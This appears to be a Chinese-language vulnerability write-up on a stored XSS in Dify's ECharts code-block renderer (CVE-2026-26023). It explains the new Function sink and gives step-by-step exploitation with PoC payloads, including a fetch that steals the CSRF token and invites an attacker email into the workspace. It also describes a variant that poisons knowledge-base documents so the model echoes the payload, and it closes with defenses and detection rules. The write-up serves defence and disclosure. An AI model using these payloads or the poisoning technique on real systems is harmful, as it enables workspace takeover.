---
id: web-generic-xss-dify-echarts-new-function-workspace-takeover
title: Dify ECharts 代码块 new Function 存储型 XSS：聊天日志触发并邀请自己加入工作区（成员）
type: scenario
domain: web
path: web/generic/xss
technique: dify-echarts-new-function-stored-xss
aliases:
- Dify ECharts XSS
- CVE-2026-26023
- echarts 代码块 XSS
- new Function 渲染 XSS
- Dify 工作区提权
- 聊天日志存储型 XSS
tags:
- dify
- ai-platform
- xss
- stored-xss
- dom-xss
- new-function
- echarts
- csrf-token
- workspace
- privilege-escalation
- rag
cve:
- CVE-2026-26023
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: Dify < 1.13.0
verification:
  verified_by: orchestrator-fix
  verified_at: '2026-11-06T07:50:06+08:00'
  notes: V159 指出截图13角色为成员而非管理员；已按截图修正标题/结论/步骤，管理员角色未证实
---

## 一句话结论

Dify < 1.13.0 的聊天前端在渲染 `echarts` 代码块时，`JSON.parse()` 失败后会回退到 `new Function('return ' + 用户内容)()` 执行；攻击者把恶意 JS 表达式写进聊天消息的 echarts 代码块并存入历史日志，管理员查看该日志时脚本在 Dify 源下执行，读取可被 JS 访问的 `csrf_token` Cookie，调用邀请成员接口把自己加入工作区（原文称可加成管理员，但截图13显示实际角色为成员）。

## 原理

- Markdown 渲染器把 fenced code block 的语言标记为 `echarts` 时，会进入专门的图表渲染组件（原文为 `web/app/components/base/markdown-blocks/code-block.tsx`）。
- 组件先尝试用 `JSON.parse(trimmedContent)` 解析配置；开发者为了让 ECharts 配置里能写函数、注释等非 JSON 结构，在解析失败的分支里使用了 `new Function(\`return ${trimmedContent}\`)()`。
- `new Function()` 会把字符串编译成函数体并在**全局作用域**执行，等价于在当前页面执行任意 JavaScript；它不做任何语法白名单或沙箱隔离，`JSON.parse` 失败也不代表内容无害。
- 攻击者构造合法 JS 表达式即可执行代码，例如对象字面量里的立即执行函数 `_x: (() => { ... })()`；即使返回值不是合法 ECharts option，副作用（`alert`、`fetch`）已经发生，图表随后进入 error 状态也不影响利用。
- 聊天消息会被 Dify 持久化保存。管理员/所有者打开应用的“日志”查看历史对话时，前端重新渲染消息中的 echarts 代码块，脚本就在**查看者**的浏览器上下文中执行，从 DOM 型自触发变成存储型 XSS。
- Dify 的 CSRF 防护采用双提交 Cookie：`csrf_token` 存放在可由 `document.cookie` 读取的 Cookie 中，脚本能取出它并放入 `x-csrf-token` 请求头；受害者的登录 Cookie 由 `credentials: "include"` 自动携带，因此邀请请求通过 CSRF 校验。
- 邀请接口 `POST /console/api/workspaces/current/members/invite-email` 接受 `role` 参数；拥有邀请权限的管理员会话被借用后，攻击者邮箱会收到激活链接。原文称传 `role:"admin"` 可获得管理员角色，但截图13中被邀请账号实际显示为“成员”，管理员角色未被截图证实。这是“XSS 在 AI 工作区中危害被放大”的根因：页面内脚本可调用高权限业务 API，而不只是读页面数据。

## 触发条件

- 目标为 Dify < 1.13.0（原文影响版本标记）。
- 攻击者能向目标应用的聊天提交消息，消息内容包含 `echarts` 围栏代码块；公开 Web 应用、共享应用或知识库问答应用均可。
- 受害者是工作区管理员/所有者，且拥有邀请成员权限；其浏览器存在有效登录会话。
- 受害者会打开该应用的“日志/标注”并渲染到恶意消息。
- `csrf_token` Cookie 未被设置为 HttpOnly，可被页面 JavaScript 读取（Dify 默认双提交 Cookie 即如此）。
- RAG 变体额外要求：攻击者可上传或污染知识库文档，并能诱导用户让模型原样输出该文档内容。

## 利用步骤

1. 确认目标 Dify 版本 < 1.13.0，并能以任意账号（甚至未登录的公开应用访问者）在聊天中发送消息。
2. 发送包含 `echarts` 代码块的恶意消息，内容为合法 JS 表达式。先用 `alert(document.domain)` 或 `fetch` 到自有回连地址验证执行。
3. 将载荷替换为邀请请求：从 `document.cookie` 提取 `csrf_token`，向 `/console/api/workspaces/current/members/invite-email` 发送 `POST`，请求体指定攻击者邮箱、`role: "admin"`、`language: "en-US"`。
4. 等待管理员在控制台“日志”中查看该应用的历史对话；消息被渲染时脚本执行，邀请请求以管理员身份发出，页面上通常只看到图表错误，无明显提示。
5. 攻击者邮箱收到 Dify 邀请邮件，点击“在此登录/Login Here”，通过 `activate?token=...` 设置账号密码并登录。
6. 验证已进入受害工作区；截图中角色为“成员”（原文宣称管理员，未提供管理员角色成功证据）。
7. 授权测试时只邀请自有邮箱并立即记录证据，不读取或导出业务数据。

RAG 文档投毒变体：

1. 把同样的 echarts 载荷写入 txt 等知识库文档并上传到目标知识库。
2. 诱导用户提出“原样输出知识库内容（包含 ```echarts）”之类的问题，使模型回复中带出代码块。
3. 回复进入聊天记录后，任何查看该记录的用户浏览器都会触发同一渲染 sink；后续提权步骤相同。

## PoC

最小验证载荷（发送到聊天，受害者打开日志时弹窗）：

````markdown
```echarts
({
  title: { text: 'Test XSS' },
  series: [],
  _x: (() => {
    alert(document.domain);
    return 1;
  })()
})
```
````

提权载荷（`fetch(...)` 本身也是合法表达式，执行后返回 undefined，图表显示错误但请求已发出）：

````markdown
```echarts
fetch("/console/api/workspaces/current/members/invite-email", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json",
    "x-csrf-token": document.cookie
      .split("; ")
      .find(c => c.startsWith("csrf_token="))
      ?.split("=")[1] || ""
  },
  body: JSON.stringify({
    emails: ["attacker@example.com"],
    role: "admin",
    language: "en-US"
  })
})
```
````

说明：`new Function` 的函数体是 `return ${内容}`，因此内容必须是合法 JS 表达式；需要多条语句时用逗号运算符或 IIFE 包裹。原文实测中该 `fetch` 载荷在日志中显示 `ECharts error – Wrong option.`，但邀请邮件已成功发出。

## 变体与关联

- 变体（RAG 投毒投递）：不直接发消息，而是污染知识库文档，让模型在回答中“引用” echarts 代码块，降低攻击者需要直接接触聊天界面的条件，也更隐蔽。
- 变体（LLM 输出投递）：诱导模型生成含恶意 echarts 代码块的回复，聊天记录同样持久化并在日志中触发。
- 变体（其他渲染器）：任何把代码块内容交给 `eval`/`new Function`/字符串 `setTimeout` 的前端图表或模板渲染器都存在同类 sink；可审计 `mermaid`、自定义图表、公式渲染等组件。
- 关联：[[web-generic-xss-json-eval-backslash-escape]]（同为 `new Function`/`eval` 消费非严格 JSON 的注入）；[[web-generic-xss-scriptless-execution-vectors]]（无 script 标签的脚本执行面）；[[ai-security-agent-security-dify-code-sandbox-network-egress]]（同一 Dify 平台的另一类越权执行面）。
- 关联：AI 工作区平台普遍把 XSS 从“读页面数据”放大为“调用高权限 API”，评估时应把页面脚本能触达的业务接口（邀请、密钥、数据集、模型配置）纳入危害链。

## 检测与防御

- 防御（根治）：升级 Dify 至 1.13.0 及以上；该版本移除了 `new Function` 回退，只接受 `JSON.parse` 成功的纯 JSON，解析失败直接置为 error。
- 防御（代码）：禁止对用户/模型内容使用 `eval`、`new Function`、字符串 `setTimeout`；需要函数能力时使用受限 DSL 或显式白名单，而不是把整段字符串编译执行。
- 防御（CSP）：配置严格 CSP，禁止 `unsafe-eval` 与内联脚本；`script-src` 使用 nonce/hash，`connect-src` 限制外连，可显著削弱同类载荷。
- 防御（权限）：收紧工作区邀请权限，禁止普通管理员邀请管理员；邀请接口对角色做服务端校验并要求二次确认；`csrf_token` Cookie 尽量设置 `HttpOnly`+`SameSite`，或改用 header 下发的一次性 token。
- 检测：审计聊天记录/知识库文档中的 `echarts` 代码块是否含 `function`、`=>`、`fetch`、`document.cookie`、`new Function`、`eval`、`import(` 等特征；对 `POST /console/api/workspaces/current/members/invite-email` 中 `role: "admin"` 的调用做告警并与 UI 操作审计比对。
- 检测：监控工作区成员列表异常新增、邀请邮件发送给外部域名邮箱；前端错误日志中大量 `ECharts error – Wrong option.` 伴随异常请求可作为弱信号。
- 响应：回滚可疑邀请、禁用被添加账号、轮换工作区 API 密钥与模型供应商凭据，清理恶意聊天记录/知识库文档并升级版本。
